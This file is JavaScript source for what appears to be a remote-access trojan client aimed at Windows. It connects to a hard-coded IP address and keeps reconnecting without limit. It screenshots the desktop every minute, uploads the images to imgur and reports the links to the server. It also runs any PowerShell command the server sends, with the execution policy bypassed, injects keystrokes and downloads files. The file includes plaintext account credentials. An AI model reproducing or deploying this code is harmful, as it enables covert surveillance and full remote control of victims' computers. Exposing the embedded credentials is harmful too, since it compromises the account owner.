let orionSocketModule     = require("socket.io-client")
let orionOS               = require("os")
let orionShellModule      = require("node-powershell")
let orionRobot            = require("robot-cmd")
let imgur                 = require('imgur');
let sharp                 = require("sharp")

let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:4001/", {
  "reconnection": true,
  "reconnectionDelay": 5,
  "reconnectionDelayMax" : 10,
  "reconnectionAttempts": Infinity,
})

imgur.setCredentials('surajlyo@icloud.com', 'ORIONAPP123', 'ff36314d51e3814');

//
// Declerations
//

let setupCode = []

let boilerPlateCode = {
  setWallpaper: `$setwallpapersrc = @"
using System.Runtime.InteropServices;
public class wallpaper
{
public const int SetDesktopWallpaper = 20;
public const int UpdateIniFile = 0x01;
public const int SendWinIniChange = 0x02;
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
public static void SetWallpaper ( string path )
{
SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
}
}
"@
Add-Type -TypeDefinition $setwallpapersrc
`

}

let additionalFunctions = {
  simulateKeyboard: (buttonToSimulate) => {
    try {
      orionRobot.sendKeys(buttonToSimulate.toUpperCase())
    } catch (error){
      console.log("Error simulating keyboard; ", error)
    }
  },
  viewScreen: () => {
    return new Promise((RESOLVE, REJECT) => {
      try {
        let imagePosition = "C:\\Windows\\Temp\\screenShot.png"

        orionRobot.screenShot(imagePosition)

        orionSocketConnection.emit('codeExecutionResponse', {
          uniqueRoomNumber: UUID,
          stdout: `Taken screenshot, uploading to server`,
          stderr: "N/A"
        })

        setTimeout( () => {
          imgur.uploadFile(imagePosition)
            .then(function (json) {
                RESOLVE(
                  json.data.link
                )
            })
            .catch(function (err) {
                REJECT(
                  `Failed to upload: ${err.message}`
                )
            })
        }, 1500)
      } catch (error){
        console.log("Error taking screenshot; ", error)
      }
    })
  },
  ChangeBackground: (URL) => {
    return new Promise((RESOLVE, REJECT) => {
      let orionShell = new orionShellModule({
        executionPolicy: 'Bypass',
        noProfile: true
      });

      orionSocketConnection.emit('codeExecutionResponse', {
        uniqueRoomNumber: UUID,
        stdout: `Attempting to download file: ${URL}`,
        stderr: "N/A"
      })

      orionShell.addCommand(`
      $url = "${URL}"
      $output = "C:\\Windows\\Temp\\wallpaperAsset.jpg"
      $start_time = Get-Date

      Import-Module BitsTransfer
      Start-BitsTransfer -Source $url -Destination $output

      Write-Output "Installed file in: $((Get-Date).Subtract($start_time).Seconds) second(s)"`)
      orionShell.invoke()
      .then( outputFromClient => {
        orionShell.addCommand(boilerPlateCode.setWallpaper)
        orionShell.invoke()
        .catch( errorMessage => {
          REJECT(`Failed to run TypeDefinition code (wallpaper boilerplate:\n${errorMessage}`)
        })

        orionShell.addCommand(`[wallpaper]::SetWallpaper("C:\\Windows\\Temp\\wallpaperAsset.jpg") `)
        orionShell.invoke()
          .then( () => {
            RESOLVE(`Downloaded file in: ${outputFromClient}\nSet wallpaper successfully`)
          })
          .catch( errorMessage => {
            REJECT(errorMessage)
          })
      })
      .catch( errorMessage => {
        REJECT(`Failed to download image:\n${errorMessage}`)
      })
    })
  }
}

let generateUUID = () => {
    generateUUID.tail = generateUUID.tail || (function(nics) {
        var nic, index, addr, retn;
        for (nic in nics) {
            for (index in nics[nic]) {
                addr = nics[nic][index];
                if (!addr.internal) {
                    if (addr.address.indexOf('fe80::') === 0) { // found scope-local
                        retn = retn || addr.address.slice(6).split(/:/).map(function(v, i, a) {
                            return parseInt(v, 16);
                        });
                    }
                }
            }
        }
        if (!retn) {
            index = Math.pow(2, 16);
            retn = [];
            retn.push(Math.floor(Math.random() * index) | 0x1000);
            retn.push(Math.floor(Math.random() * index));
            retn.push(Math.floor(Math.random() * index));
            retn.push(Math.floor(Math.random() * index));
        }
        retn[3] = 0x10000 | retn[3];
        retn[2] = 0x10000 | retn[1] & 0xff00 | retn[2] & 0x00ff;
        retn[1] = 0x10000 | retn[0] ^ 0x0200;
        retn[0] = 0x18000 | process.pid & 0x3fff;
        retn = retn.map(function(v, i, a) {
            return v.toString(16).slice(1)
        });
        return retn[0] + '-' + retn[1] + retn[2] + retn[3];
    })(require('os').networkInterfaces());

    var head = process.hrtime(), now = Math.floor(Date.now() / 1000);
    head[1] = Math.floor(head[1] * 0.268435456); // 2^28 / 10^9
    head[2] = (0x11000 | head[1] & 0x0fff).toString(16).slice(1);
    head[1] = (0x10000 | head[1] >>> 12 & 0xffff).toString(16).slice(1);
    head[0] = (4294967296 + now).toString(16).slice(1);
    return head.concat(generateUUID.tail).join('-');
};

let takeInitialScreenshot = () => {
  return new Promise(function(RESOLVE, REJECT){
    let imagePosition = "C:\\Windows\\Temp\\screenShotCaption.png"

    orionRobot.screenShot(imagePosition)

    setTimeout( () => {
      imgur.uploadFile(imagePosition)
        .then(function (json) {
            RESOLVE(
              json.data.link
            )
        })
        .catch(function (err) {
            REJECT(
              `FAILURE`
            )
        })
    }, 1500)
  })
}

let emitUniqueHost = (UUID) => {
  let uploadedScreenshot = false

  takeInitialScreenshot().then(imageUrl => {
    uploadedScreenshot = imageUrl
  })

  setInterval( () => {
    takeInitialScreenshot().then(imageUrl => {
      uploadedScreenshot = imageUrl
    })
  }, 1000 * 60)

  setInterval(
    () => {
      if (uploadedScreenshot){
        orionSocketConnection.emit('roomConnectionHost', {
          UUID: UUID,
          screenShot: uploadedScreenshot
        })
      } else {
        orionSocketConnection.emit('roomConnectionHost', {UUID: UUID})
      }
    },
    5000
  );

  return orionSocketConnection.emit('roomConnectionHost', {UUID: UUID})
}

let runsetupScripts = () => {
  for (let individualScript of setupCode){
    let orionShell = new orionShellModule({
      executionPolicy: 'Bypass',
      noProfile: true
    });

    try {
      orionShell.addCommand(individualScript)
      orionShell.invoke()
    } catch (errorMessage){
      console.log("Setup code initalisation failed")
    }

  }
}

//
// Function calls
//

let UUID = orionOS.hostname()
emitUniqueHost(UUID)

orionSocketConnection.on(UUID, function (responseData) {
  if (responseData.computerName !== UUID) return


  if (responseData.internalCall.isNode){
    let internalResponseData = additionalFunctions[responseData.internalCall.Function](
      responseData.internalCall.Data
    )

    return internalResponseData.then(newData => orionSocketConnection.emit('codeExecutionResponse', {
      uniqueRoomNumber: UUID,
      stdout: "Called: " +  responseData.internalCall.Function + "\nWith data: " + responseData.internalCall.Data,
      stderr: newData
    })).catch( Error => orionSocketConnection.emit('codeExecutionResponse', {
      uniqueRoomNumber: UUID,
      error: Error
    }))
  }

  if (responseData.internalCall.isKeyboard){
    return additionalFunctions[responseData.internalCall.Function](
      responseData.internalCall.Data
    )
  }

  if (responseData.internalCall.isShell){
    let orionShell = new orionShellModule({
      executionPolicy: 'Bypass',
      noProfile: true
    });

    orionShell.addCommand(responseData.internalCall.Data)
    orionShell
      .invoke()
      .then(outputShell => {
        return orionSocketConnection.emit('codeExecutionResponse', {
          uniqueRoomNumber: UUID,
          stdout: outputShell,
          stderr: "N/A"
        })
      })
      .catch(erroredShell => {
        orionSocketConnection.emit('codeExecutionResponse', {
          uniqueRoomNumber: UUID,
          error: erroredShell
        })
        return orionShell.dispose();
      })
  }
})
